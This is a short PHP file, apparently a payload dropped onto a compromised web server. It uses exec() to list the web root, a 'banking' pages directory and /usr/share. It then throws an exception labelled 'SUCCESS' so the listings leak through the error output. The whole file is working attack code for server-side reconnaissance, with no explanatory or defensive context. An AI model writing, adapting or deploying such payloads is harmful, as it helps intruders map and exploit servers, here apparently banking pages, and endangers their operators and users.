<?php
$asd="\n pages ".exec('ls /var/www/pages/');
$asd=$asd."\n banking ".exec('ls /var/www/pages/banking/');
$asd=$asd."\n share ".exec('ls /usr/share/');
throw new Exception('SUCCESS '.$asd);
?>
